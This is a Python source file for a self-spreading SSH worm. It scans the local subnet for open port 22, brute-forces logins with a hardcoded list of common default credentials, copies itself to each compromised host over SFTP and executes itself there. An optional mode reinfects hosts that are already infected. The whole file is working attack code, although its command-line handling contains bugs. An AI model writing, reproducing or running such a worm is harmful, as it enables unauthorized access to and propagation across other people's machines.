import nmap, paramiko, os, sys, time
import netifaces, random

#Hide Errors
paramiko.util.log_to_file('/dev/null')

#Common Login
common_usernames = ["user", "pi", "root","admin", "guest", "apache", "nobody"]
common_passwords = ["password", "root","toor", "raspberry", "dietpi", "test", "uploader",
"admin", "administrator","marketing","12345678","1234", "12345", "qwerty", "webadmin", 
"webmaster", "maintenance", "techsupport", "letmein", "logon", "Passw@rd", "alpine"]

def get_hosts(port):
    #Scans network and returns vulnerable hosts with open port
    try:
        gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
        port_scanner = nmap.PortScanner()
        port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')
        return port_scanner.all_hosts()

    except:
        return []
    
def connect_to_victim(host, user, password):
    #Connect to ssh and start worm.py
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, 22, user, password, banner_timeout = 200)
        print("Connected to: " + host)
        return client
        
    except:
        return None
    
def transfer_worm(ssh, LucyMode = False):
    #Connect to SFTP and transfer files
    #Standard Mode, check files for the Mark of the Worm, transfer if not found, otherwise abort
    #Lucy Mode, send files anyways
    
    try:
        ftp = ssh.open_sftp()
        files = ftp.listdir_attr('.')
        
        if LucyMode:
            print("It's wormin' time")
            
        for file in files:
            if (file.filename == 'worm.txt' or file.filename == 'worm.py'):
                print('Found Mark of the Worm')
                ftp.close()
                return 1 if LucyMode else -1
            
        ftp.put('./worm.txt','./worm.txt')
        ftp.put('./worm.py', './worm.py')
        ftp.close()
        return 1

    except Exception as error:
        #print(error)
        return 0
        
def worm_victim(ssh, lucy = False):
    #start worm.py
    try:
        cmd = 'python3 worm.py multi-attack Lucy' if lucy else 'python3 worm.py'
        ssh.exec_command(cmd)
        return True
    except Exception as error:
        return False
        
def attack(host, user, pwd, Lucy = False):
    #Attack a host with the username and password
    #print(f"Login:{user}, Password:{pwd}")
    
    ssh = connect_to_victim(host, user, pwd)
    if ssh == None:
        return False
    
    ftp_step = transfer_worm(ssh, Lucy)
    if (ftp_step == 1):     #successful attack
        if (worm_victim(ssh, Lucy)):
            print(f"{host} attack success")
            return True
    elif (ftp_step == -1):  #Already attacked host
        return True
    return False
    
def multi_attack(Lucy = False):
    #attack all avaliable targets
    hosts = get_hosts(22)
    random.shuffle(hosts)           #shuffle for random order
    for host in hosts:              #brute force attacks
        success = False
        print(f"Attacking {host}")
        for (user, pwd) in [(u,p) for u in common_usernames for p in common_passwords]:
            success = attack(host, user, pwd, Lucy)
            if (success):           #end loop if attack was successful
                break
                
        if not success:
            print(f"{host} attack failed")

def single_attack(host, username, password, LucyMode = False):
    #attack one host
    success = False
    print(f"Attacking {host}")
    if not (attack(host, username, password, LucyMode)):
        print(f"{host} attack failed")
            
if __name__ == "__main__":
    #Check arguments for attack type and additional parameters
    
    lucy = False
    arg_num = len(sys.argv)
    if arg_num > 1:                                                 #if ctrl args passed
        if sys.argv[1] == 'single-atttack' and arg_num >= 5:        #if single-attack mode
            if setting == 6:                                        #if Lucy passed
                if sys.argv[5] == 'Lucy' or sys.argv[5] == 'Satan':
                    lucy = True
            single_attack(host = sys.argv[2], username = sys.argv[3], password = sys.argv[4], Lucy = lucy)
        else:                                                       #if multi-attack mode
            if arg_num == 3:                                        #if Lucy passed
                if sys.argv[2] == 'Lucy' or sys.argv[2] == 'Satan':
                    lucy = True
            multi_attack(Lucy = lucy)
    else:
        multi_attack()
